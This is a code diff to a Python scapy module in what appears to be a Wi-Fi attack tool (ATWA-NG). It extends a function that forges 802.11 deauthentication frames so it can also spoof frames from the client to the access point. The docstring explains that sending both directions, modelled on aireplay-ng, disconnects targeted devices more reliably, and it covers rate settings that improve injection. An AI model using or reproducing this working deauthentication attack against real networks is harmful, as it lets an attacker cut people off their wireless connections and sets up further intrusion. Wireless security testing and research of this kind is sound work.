@@ -74,7 +74,7 @@ def craft_probe_resp(
     return pkt
 
 
-def craft_deauth(bssid: str, client: str = BROADCAST, reason: int = 7, low_rate: bool = False) -> Packet:
+def craft_deauth(bssid: str, client: str = BROADCAST, reason: int = 7, low_rate: bool = False, from_client: bool = False) -> Packet:
     """Craft a deauthentication frame from bssid to client (default broadcast).
 
     low_rate: force the RadioTap Rate field to 6 Mbps (802.11a/g OFDM;
@@ -83,9 +83,24 @@ def craft_deauth(bssid: str, client: str = BROADCAST, reason: int = 7, low_rate:
     AWUS1900) are unreliable injecting unset-rate frames across all of
     their antennas -- forcing the lowest common OFDM rate trades a bit
     of airtime for delivery.
+
+    from_client: build the reverse-direction frame instead (spoofed as
+    coming FROM client TO bssid) -- addr3 (the BSSID field) stays bssid
+    either way, only addr1/addr2 (destination/source) swap. 2026-08-30:
+    the vendored aircrack-ng's own aireplay-ng `-0`/`--deauth` (confirmed
+    in vendor/aircrack-ng/src/aireplay-ng/aireplay-ng.c's do_attack_deauth)
+    always sends BOTH directions per round when a specific client is
+    targeted, precisely because a frame lost in one direction (RF noise,
+    a dropped retry) can leave the *other* endpoint still thinking it's
+    associated. ATWA-NG's own deauth() previously only ever sent the
+    AP-to-client direction -- see deauth() below, now fixed to send both
+    when a real client (not BROADCAST) is targeted.
     """
     radiotap = RadioTap(present="Rate", Rate=12) if low_rate else RadioTap()
-    dot11 = Dot11(type=0, subtype=12, addr1=client, addr2=bssid, addr3=bssid)
+    if from_client:
+        dot11 = Dot11(type=0, subtype=12, addr1=bssid, addr2=client, addr3=bssid)
+    else:
+        dot11 = Dot11(type=0, subtype=12, addr1=client, addr2=bssid, addr3=bssid)
     return radiotap / dot11 / Dot11Deauth(reason=reason)
 
 
